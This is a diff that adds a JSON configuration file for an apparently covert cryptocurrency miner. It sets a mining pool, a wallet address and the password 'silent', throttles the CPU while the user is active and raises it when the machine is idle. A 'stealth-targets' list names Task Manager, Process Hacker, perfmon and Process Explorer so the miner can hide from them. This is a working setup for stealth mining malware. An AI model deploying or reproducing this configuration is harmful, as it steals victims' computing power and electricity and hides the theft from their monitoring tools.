@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "pool.hashvault.pro",
+    "port": 443,
+    "wallet": "45wJ5nPz3sYYn2pKAhABZLLhKBrdT1qG4Svtc5BVxjB4SmtkGUwf1ANHGJGrcLf8jgTRbaM4KmUp5EZ3Sdim24StNN1iSCW",
+    "password": "silent",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 20,
+    "idle-wait": 3,
+    "idle-cpu": 90,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
